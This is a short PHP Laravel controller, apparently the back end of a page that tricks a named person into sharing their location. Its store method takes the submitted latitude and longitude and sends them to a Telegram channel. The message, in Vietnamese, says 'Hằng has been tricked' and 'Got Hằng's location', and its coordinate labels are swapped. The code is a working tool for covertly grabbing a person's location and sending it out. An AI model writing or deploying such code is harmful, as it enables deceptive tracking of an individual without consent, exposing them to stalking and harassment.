<?php

namespace App\Http\Controllers\Home;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Telegram\Bot\Laravel\Facades\Telegram;

class HomeController extends Controller
{
    public function index() {
        return view('index');
    }

    public function store(Request $request) {
        $longitude = $request->longitude;
        $latitude = $request->latitude;
        $text = "
            Hằng đã bị lừa
            Đã lấy được vị trí của hằng
            Kinh độ: <b>$latitude</b>
            Vỹ độ: <b>$longitude</b>
        ";

        Telegram::sendMessage([
            'chat_id' => env('TELEGRAM_CHANNEL_ID', ''),
            'parse_mode' => 'HTML',
            'text' => $text
        ]);

        return redirect()->route('index-location');
    }
}
